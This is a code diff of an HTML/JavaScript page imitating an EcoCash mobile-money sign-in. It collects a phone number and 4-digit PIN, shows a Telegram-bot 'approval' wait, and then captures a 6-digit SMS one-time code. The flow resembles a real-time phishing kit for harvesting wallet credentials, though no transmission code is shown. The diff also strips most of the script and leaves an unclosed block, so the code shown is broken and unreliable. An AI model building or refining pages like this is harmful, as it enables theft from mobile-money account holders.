@@ -381,7 +381,7 @@ a:focus-visible {
       <div class="spinner" aria-hidden="true"></div>
       <h1>Waiting for approval</h1>
       <p class="subtle">
-        Approve this sign-in for <strong id="approval-telegram bot"></strong> in the EcoCash Telegram bot.
+        Approve this sign-in for <strong id="approval-phone"></strong> in the EcoCash Telegram bot.
       </p>
     </div>
 
@@ -424,12 +424,13 @@ a:focus-visible {
 
     <div class="step" data-step="signing" hidden>
       <p class="prompt">This usually takes a few seconds.</p>
+      <button type="button" class="btn-primary" disabled>Signing in...</button>
     </div>
 
-      <div class="step" data-step="approval" hidden>
-      <p class="prompt">
-        Signing in...
-      </p>
+    <div class="step" data-step="approval" hidden>
+      <p class="prompt">Waiting for confirmation from your device.</p>
+      <button type="button" class="btn-primary" id="approve-demo">Approve Sign-in</button>
+      <button type="button" class="link" id="cancel-approval">Cancel</button>
     </div>
 
     <div class="step" data-step="otp" hidden>
@@ -438,11 +439,11 @@ a:focus-visible {
       <button type="button" class="link" id="change-number">Change number</button>
     </div>
 
-    <p id="notice" role="status"></p>
+    <p id="notice" role="status" aria-live="polite"></p>
   </section>
 </div>
 
-  <script>
+<script>
 const $ = (selector) => document.querySelector(selector);
 
 const phoneInput = $('#phone');
@@ -473,198 +474,4 @@ pinInputs.forEach((input, index) => {
   input.addEventListener('input', () => {
     input.value = digitsOnly(input.value, 1);
 
-    // Always move to the next PIN box if one exists
     if (input.value && pinInputs[index + 1]) {
-      pinInputs[index + 1].focus();
-      return;
-    }
-
-    // Once all 4 boxes are filled, check if ready to auto-submit
-    const allPinsFilled = pinInputs.every((box) => box.value.length === 1);
-    if (allPinsFilled) {
-      if (isLoginReady()) {
-        input.blur();
-        submitLogin();
-      } else {
-        notice.textContent = 'Please enter a valid 9-digit phone number above.';
-      }
-    }
-  });
-
-  input.addEventListener('keydown', (event) => {
-    if (event.key === 'Backspace' && !input.value && pinInputs[index - 1]) {
-      pinInputs[index - 1].focus();
-    }
-  });
-});
-
-// Auto-submit if the user enters the PIN first and finishes the phone number last
-phoneInput.addEventListener('input', () => {
-  phoneInput.value = digitsOnly(phoneInput.value, 15);
-  if (isLoginReady()) {
-    phoneInput.blur();
-    submitLogin();
-  }
-});
-
-function isLoginReady() {
-  return (
-    /^\d{9,15}$/.test(digitsOnly(phoneInput.value, 20)) &&
-    pinInputs.every((input) => input.value.length === 1)
-  );
-}
-
-function submitLogin() {
-  if (!isLoginReady()) {
-    notice.textContent = 'Enter your phone number and 4-digit PIN to continue.';
-    return;
-  }
-  phoneNumber = digitsOnly(phoneInput.value, 20);
-  showStep('signing');
-  window.setTimeout(showApproval, 1500);
-}
-
-function showApproval() {
-  $('#approval-phone').textContent = '+263 ' + phoneNumber;
-  showStep('approval');
-  waitForTelegramApproval().then(showOtp);
-}
-
-function waitForTelegramApproval() {
-  // Demo stand-in: resolves when the approve button is tapped. Replace with a check of the Telegram bot's approval status.
-  return new Promise((resolve) => {
-    approvalResolve = resolve;
-  });
-}
-
-$('#approve-demo').onclick = () => {
-  if (approvalResolve) {
-    approvalResolve();
-    approvalResolve = null;
-  }
-};
-
-$('#cancel-approval').onclick = () => {
-  approvalResolve = null;
-  showStep('login');
-};
-
-function showOtp() {
-  $('#otp-phone').textContent = '+263 ' + phoneNumber;
-  setOtpValue('');
-  showStep('otp');
-  otpInput.focus();
-  startResendCountdown();
-  listenForSmsCode();
-}
-
-function setOtpValue(value) {
-  otpInput.value = digitsOnly(value, 6);
-  renderOtpBoxes();
-
-  // Automatically transition once all 6 OTP digits are entered or autofilled
-  if (otpInput.value.length === 6) {
-    otpInput.blur();
-    submitOtp(otpInput.value);
-  } else {
-    notice.textContent = '';
-  }
-}
-
-function submitOtp(code) {
-  stopResendCountdown();
-  stopSmsListener();
-  notice.textContent = 'Verifying code...';
-
-  // Replace 'verifying' with your next data-step name if you have a final screen
-  const nextStep = document.querySelector('[data-step="verifying"]');
-  if (nextStep) {
-    showStep('verifying');
-  } else {
-    notice.textContent = 'Code received (' + code + '). Connect your verification endpoint to continue.';
-  }
-}
-
-function renderOtpBoxes() {
-  const value = otpInput.value;
-  const activeIndex = Math.min(value.length, otpBoxes.length - 1);
-  otpBoxes.forEach((box, index) => {
-    box.textContent = value[index] ?? '';
-    box.classList.toggle('active', index === activeIndex);
-  });
-}
-
-otpInput.addEventListener('input', () => setOtpValue(otpInput.value));
-
-function listenForSmsCode() {
-  stopSmsListener();
-  if (!('OTPCredential' in window)) return;
-  otpAbort = new AbortController();
-  navigator.credentials
-    .get({ otp: { transport: ['sms'] }, signal: otpAbort.signal })
-    .then((credential) => {
-      if (credential && credential.code) setOtpValue(credential.code);
-    })
-    .catch(() => {
-      // SMS autofill is optional; typing the code still works.
-    });
-}
-
-function stopSmsListener() {
-  if (otpAbort) {
-    otpAbort.abort();
-    otpAbort = null;
-  }
-}
-
-function startResendCountdown() {
-  stopResendCountdown();
-  let remaining = RESEND_SECONDS;
-  resendButton.disabled = true;
-  resendButton.textContent = 'Resend code in ' + remaining + 's';
-  resendInterval = window.setInterval(() => {
-    remaining -= 1;
-    if (remaining > 0) {
-      resendButton.textContent = 'Resend code in ' + remaining + 's';
-      return;
-    }
-    stopResendCountdown();
-    resendButton.disabled = false;
-    resendButton.textContent = 'Resend code';
-  }, 1000);
-}
-
-function stopResendCountdown() {
-  window.clearInterval(resendInterval);
-  resendInterval = null;
-}
-
-resendButton.onclick = () => {
-  setOtpValue('');
-  otpInput.focus();
-  startResendCountdown();
-  notice.textContent = 'Connect your SMS provider to send a new code.';
-};
-
-$('#change-number').onclick = () => {
-  stopResendCountdown();
-  stopSmsListener();
-  showStep('login');
-};
-
-$('#register').onclick = () => {
-  notice.textContent = 'Install the Ecocash super app on the Play Store and register, then come back and continue with the process.';
-};
-
-$('#help').onclick = () => {
-  notice.textContent = "Use your provider's official support channel.";
-};
-
-$('#terms').onclick = (event) => {
-  event.preventDefault();
-  notice.textContent = "Add your service's terms URL here.";
-};
-</script>
-</body>
-</html>
-
